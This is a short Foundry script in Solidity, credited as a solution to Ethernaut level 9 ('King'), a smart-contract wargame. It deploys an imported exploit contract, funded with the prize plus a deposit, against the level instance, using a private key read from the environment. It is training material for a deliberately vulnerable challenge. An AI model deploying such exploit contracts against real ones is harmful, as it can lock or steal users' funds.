// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {King} from "src/09/King.sol";
import {KingExploit} from "src/09/KingExploit.sol";


contract Exploit is Script {

    King public king;
    KingExploit public exploit;    
    address payable instance = payable(vm.envAddress("INSTANCE_LEVEL9"));  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
    uint256 immutable initialDeposit = 0.001 ether; 
          
    function run() external {
        vm.startBroadcast(hacker);
        king = King(instance);
        exploit = new KingExploit{value: king.prize() + initialDeposit}(address(king));
        vm.stopBroadcast();
    }
}
